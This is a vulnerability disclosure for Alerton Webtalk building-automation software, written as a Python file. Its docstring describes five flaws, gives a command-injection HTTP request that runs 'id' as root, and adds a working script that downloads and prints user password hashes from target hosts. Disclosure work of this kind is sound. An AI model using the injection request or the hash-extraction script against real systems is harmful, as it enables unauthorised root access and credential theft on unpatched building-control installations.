@@ -1,0 +1,199 @@
+'''
+Security Issues in Alerton Webtalk
+==================================
+
+Introduction
+------------
+
+Vulnerabilities were identified in the Alerton Webtalk Software supplied by
+Alerton.  This software is used for the management of building automation
+systems.  These were discovered during a black box assessment and therefore
+the vulnerability list should not be considered exhaustive.  Alerton has
+responded that Webtalk is EOL and past the end of its support period.  Customers
+should move to newer products available from Alerton.  Thanks to Alerton for prompt
+replies in communicating with us about these issues.
+
+Versions 2.5 and 3.3 were both confirmed to be affected by these issues.
+
+Webtalk-01 - Password Hashes Accessible to Unauthenticated Users
+----------------------------------------------------------------
+
+Severity: **High**
+
+Password hashes for all of the users configured in Alerton Webtalk are
+accessible via a file in the document root of the ‘webtalk’ user.  The
+location of this file is configuration dependent, however the configuration file is
+accessible as well (at a static location, /~webtalk/webtalk.ini).  The
+password
+database is a sqlite3 database whose name is based on the bacnet rep and job
+entries from the ini file.
+
+A python proof of concept to reproduce this issue is in an appendix.
+
+Recommendation: Do not store sensitive data within areas being served by the
+webserver.
+
+Webtalk-02 - Command Injection for Authenticated Webtalk Users
+--------------------------------------------------------------
+
+Severity: **High**
+
+Any user granted the “configure webtalk” permission can execute commands as
+the root user on the underlying server.  There appears to be some effort of
+filtering command strings (such as rejecting commands containing pipes and
+redirection operators) but this is inadequate.  Using this vulnerability, an
+attacker can add an SSH key to the root user’s authorized_keys file.
+
+GET
+/~webtalk/WtStatus.psp?c=update&updateopts=&updateuri=%22%24%28id%29%22&update=True
+HTTP/1.1
+Host: test-host
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101
+Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: NID=...; _SID_=...; OGPC=...:
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 200 OK
+Date: Mon, 23 Jan 2017 20:34:26 GMT
+Server: Apache
+cache-control: no-cache
+Set-Cookie: _SID_=...; Path=/;
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 2801
+
+...
+uid=0(root) gid=500(webtalk) groups=500(webtalk)
+...
+
+
+Recommendation: User input should be avoided to shell commands.  If this is
+not possible, shell commands should be properly escaped.  Consider using one of
+the functions from the subprocess module without the shell=True parameter.
+
+Webtalk-03 - Cross-Site Request Forgery
+---------------------------------------
+
+Severity: **High**
+
+The entire Webtalk administrative interface lacks any controls against
+Cross-Site Request Forgery.  This allows an attacker to execute
+administrative changes without access to valid credentials.  Combined with the above
+vulnerability, this allows an attacker to gain root access without any
+credentials.
+
+Recommendation: Implement CSRF tokens on all state-changing actions.
+
+Webtalk-04 - Insecure Credential Hashing
+----------------------------------------
+
+Severity: **Moderate**
+
+Password hashes in the userprofile.db database are hashed by concatenating
+the password with the username (e.g., PASSUSER) and performing a plain MD5
+hash.  No salts or iterative hashing is performed.  This does not follow password
+hashing best practices and makes for highly practical offline attacks.
+
+Recommendation: Use scrypt, bcrypt, or argon2 for storing password hashes.
+
+Webtalk-05 - Login Flow Defeats Password Hashing
+------------------------------------------------
+
+Severity: **Moderate**
+
+Password hashing is performed on the client side, allowing for the replay of
+password hashes from Webtalk-01.  While this only works on the mobile login
+interface (“PDA” interface, /~webtalk/pda/pda_login.psp), the resulting
+session is able to access all resources and is functionally equivalent to a login
+through the Java-based login flow.
+
+Recommendation: Perform hashing on the server side and use TLS to protect
+secrets in transit.
+
+
+Timeline
+--------
+
+2017/01/?? - Issues Discovered
+2017/01/26 - Issues Reported to security@honeywell.com
+2017/01/30 - Initial response from Alerton confirming receipt.
+2017/02/04 - Alerton reports Webtalk is EOL and issues will not be fixed.
+2017/04/26 - This disclosure
+
+Discovery
+---------
+
+These issues were discovered by David Tomaschik of the Google ISA
+Assessments team.
+
+Appendix A: Script to Extract Hashes
+------------------------------------
+'''
+
+import requests
+import sys
+import ConfigParser
+import StringIO
+import sqlite3
+import tempfile
+import os
+
+
+def get_webtalk_ini(base_url):
+    """Get the webtalk.ini file and parse it."""
+    url = '%s/~webtalk/webtalk.ini' % base_url
+    r = requests.get(url)
+    if r.status_code != 200:
+        raise RuntimeError('Unable to get webtalk.ini: %s', url)
+    buf = StringIO.StringIO(r.text)
+    parser = ConfigParser.RawConfigParser()
+    parser.readfp(buf)
+    return parser
+
+
+def get_db_path(base_url, config):
+    rep = config.get('bacnet', 'rep')
+    job = config.get('bacnet', 'job')
+    url = '%s/~webtalk/bts/%s/%s/userprofile.db'
+    return url % (base_url, rep, job)
+
+
+def load_db(url):
+    """Load and read the db."""
+    r = requests.get(url)
+    if r.status_code != 200:
+        raise RuntimeError('Unable to get %s.' % url)
+    tmpfd, tmpname = tempfile.mkstemp(suffix='.db')
+    tmpf = os.fdopen(tmpfd, 'w')
+    tmpf.write(r.content)
+    tmpf.close()
+    con = sqlite3.connect(tmpname)
+    cur = con.cursor()
+    cur.execute("SELECT UserID, UserPassword FROM tblPassword")
+    results = cur.fetchall()
+    con.close()
+    os.unlink(tmpname)
+    return results
+
+
+def users_for_server(base_url):
+    if '://' not in base_url:
+        base_url = 'http://%s' % base_url
+    ini = get_webtalk_ini(base_url)
+    db_path = get_db_path(base_url, ini)
+    return load_db(db_path)
+
+
+if __name__ == '__main__':
+    for host in sys.argv[1:]:
+        try:
+            users = users_for_server(host)
+        except Exception as ex:
+            sys.stderr.write('%s\n' % str(ex))
+            continue
+        for u in users:
+            print '%s:%s' % (u[0], u[1])
